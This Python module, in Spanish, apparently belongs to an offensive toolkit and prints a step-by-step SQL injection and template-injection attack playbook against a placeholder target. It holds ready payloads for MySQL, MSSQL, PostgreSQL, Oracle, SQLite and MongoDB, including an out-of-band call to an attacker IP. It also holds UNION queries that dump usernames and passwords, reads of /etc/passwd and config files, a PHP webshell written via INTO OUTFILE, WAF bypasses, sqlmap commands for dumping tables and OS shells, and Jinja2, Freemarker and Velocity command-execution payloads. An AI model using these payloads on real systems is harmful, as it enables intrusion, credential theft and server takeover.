import sys

class Colors:
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def _cmd(c): sys.stdout.buffer.write(f"    {Colors.OKGREEN}{c}{Colors.ENDC}\n".encode('utf-8')); sys.stdout.buffer.flush()
def _tip(c): print(f"    {Colors.OKCYAN}# {c}{Colors.ENDC}")
def _header(t): print(f"\n{Colors.BOLD}── {t} ──{Colors.ENDC}\n")

# ─── Payloads de Detección ─────────────────────────────────────────

DETECTION = {
    "Universal (todos los DB)": [
        "'", '"', "`", "\\", "' OR '1'='1", "' OR 1=1--", "admin'--", "1' AND '1'='2",
    ],
    "MySQL / MariaDB": [
        "' AND SLEEP(3)--", "1; SELECT SLEEP(3)--", "' AND 1=1--", "' AND 1=2--",
        "' UNION SELECT NULL--", "' ORDER BY 100--",
    ],
    "MSSQL": [
        "1; WAITFOR DELAY '0:0:3'--", "1'; SELECT @@version--",
        "1'; EXEC xp_cmdshell('whoami')--",
        "1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
    ],
    "PostgreSQL": [
        "1'; SELECT pg_sleep(3)--", "1' AND 1=CAST(version() AS int)--",
        "'; COPY (SELECT '') TO PROGRAM 'id'--",
    ],
    "SQLite": [
        "1' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))--",
        "1' UNION SELECT sqlite_version()--",
    ],
    "Oracle": [
        "1' AND 1=UTL_HTTP.request('http://TU_IP/')--",
        "1' UNION SELECT NULL FROM DUAL--",
    ],
    "NoSQL — MongoDB": [
        "' || 1==1//", "' || 1==1%00", 'username[$ne]=x&password[$ne]=x',
        '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
        "username=admin'%20%26%26%20this.password.length>0//",
    ],
}

WAF_BYPASS = [
    ("Spaces → Comments", "1/**/UNION/**/SELECT/**/NULL--"),
    ("URL Double Encode", "%2527 en vez de %27 (')"),
    ("Case Mix", "UnIoN SeLeCt"),
    ("Scientific Notation", "1e0UNION SELECT NULL--"),
    ("Null Bytes", "' %00 OR '1'='1"),
    ("HTTP Parameter Pollution", "?id=1&id=' UNION SELECT NULL--"),
    ("Tamper scripts sqlmap", "sqlmap --tamper=space2comment,randomcase,between"),
]

def run(url=None):
    target = url or "http://TARGET/page?id=1"
    print(f"{Colors.BOLD}{'='*60}{Colors.ENDC}")
    print(f"{Colors.OKCYAN}  MÓDULO SQLI v2.0 — OBSIDIAN TIER{Colors.ENDC}")
    print(f"{Colors.BOLD}{'='*60}{Colors.ENDC}")
    print(f"\n{Colors.OKCYAN}[*] Target: {target}{Colors.ENDC}\n")

    _header("FASE 1: Detección Manual — Por Tipo de Base de Datos")
    print(f"  {Colors.WARNING}[!] Probá en campos de login, barras de búsqueda y params GET/POST{Colors.ENDC}\n")

    for db_type, payloads in DETECTION.items():
        print(f"  {Colors.WARNING}[{db_type}]{Colors.ENDC}")
        for p in payloads:
            sys.stdout.buffer.write(f"    {Colors.OKGREEN}{p}{Colors.ENDC}\n".encode('utf-8'))
        sys.stdout.buffer.flush()
        print()

    _header("FASE 2: UNION-Based — Extracción Manual Paso a Paso")
    steps = [
        ("Paso 1 — Encontrar número de columnas", [
            "' ORDER BY 1--  (no error)",
            "' ORDER BY 2--  (no error)",
            "' ORDER BY N--  (hasta ERROR → N-1 columnas)",
        ]),
        ("Paso 2 — Encontrar columnas visibles", [
            "' UNION SELECT NULL,NULL,NULL--        (N=3 columnas)",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 'a',NULL,NULL--         (columna 1 es varchar)",
        ]),
        ("Paso 3 — Extraer metadata", [
            "' UNION SELECT 1,database(),version()--",
            "' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--",
            "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' LIMIT 0,1--",
        ]),
        ("Paso 4 — Extraer datos", [
            "' UNION SELECT 1,username,password FROM users--",
            "' UNION SELECT 1,group_concat(username,':',password),3 FROM users--",
        ]),
        ("Bonus — Leer archivos del servidor", [
            "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--",
            "' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3--",
        ]),
        ("Bonus — Escribir un webshell", [
            "' UNION SELECT 1,'<?php system($_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--",
            "# Luego acceder: http://TARGET/shell.php?cmd=id",
        ]),
    ]
    for title, cmds in steps:
        print(f"  {Colors.WARNING}[{title}]{Colors.ENDC}")
        for cmd in cmds:
            if cmd.startswith("#"):
                _tip(cmd[2:])
            else:
                _cmd(cmd)
        print()

    _header("FASE 3: WAF Bypass Techniques")
    for name, example in WAF_BYPASS:
        print(f"  {Colors.WARNING}[{name}]{Colors.ENDC}")
        sys.stdout.buffer.write(f"    {Colors.OKGREEN}{example}{Colors.ENDC}\n".encode('utf-8'))
        sys.stdout.buffer.flush()
    print()

    _header("FASE 4: SQLMap — Automatización Completa")
    sqlmap_cmds = [
        ("Detección básica", f'sqlmap -u "{target}" --dbs --batch'),
        ("Auto-detectar formularios", f'sqlmap -u "{target}" --forms --dbs --batch'),
        ("POST request", f'sqlmap -u "{target}" --data="user=a&pass=b" --dbs --batch'),
        ("Con cookie", f'sqlmap -u "{target}" --cookie="PHPSESSID=ABC" --dbs --batch'),
        ("Tablas y dump", f'sqlmap -u "{target}" -D DBNAME --tables --batch'),
        ("Dumpear tabla users", f'sqlmap -u "{target}" -D DBNAME -T users --dump --batch'),
        ("Leer archivo", f'sqlmap -u "{target}" --file-read="/etc/passwd"'),
        ("OS Shell", f'sqlmap -u "{target}" --os-shell'),
        ("Evadir WAF", f'sqlmap -u "{target}" --tamper=space2comment,randomcase,between --random-agent --dbs --batch'),
        ("2do nivel (cookies SQLi)", f'sqlmap -u "{target}" --level=5 --risk=3 --dbs --batch'),
    ]
    for desc, cmd in sqlmap_cmds:
        print(f"  {Colors.WARNING}[{desc}]{Colors.ENDC}")
        _cmd(cmd)
        print()

    _header("FASE 5: SSTI — Si el campo NO es SQLi sino Template Injection")
    ssti_payloads = [
        ("Detección Universal", ["{{7*7}} → si ves 49 = SSTI confirmado", "${7*7}", "<%= 7*7 %>"]),
        ("Jinja2 (Flask/Python)", [
            "{{config}}", "{{self.__class__.__mro__[1].__subclasses__()}}",
            "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ]),
        ("Twig (PHP)", ["{{7*7}}", "{{'/etc/passwd'|file_get_contents}}"]),
        ("Freemarker (Java)", ['<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}']),
        ("Velocity (Java)", ['#set($s=""); #set($r=$s.class.forName("java.lang.Runtime")); $r.getRuntime().exec("id")']),
    ]
    for engine, payloads in ssti_payloads:
        print(f"  {Colors.WARNING}[{engine}]{Colors.ENDC}")
        for p in payloads:
            if p.startswith("#"):
                _tip(p[2:])
            else:
                sys.stdout.buffer.write(f"    {Colors.OKGREEN}{p}{Colors.ENDC}\n".encode('utf-8'))
                sys.stdout.buffer.flush()
        print()

    print(f"{Colors.BOLD}{'='*60}{Colors.ENDC}")
    print(f"{Colors.OKCYAN}[*] Si encontrás credenciales: python Farei_0x.py hashes dump.txt{Colors.ENDC}")
    print(f"{Colors.BOLD}{'='*60}{Colors.ENDC}")
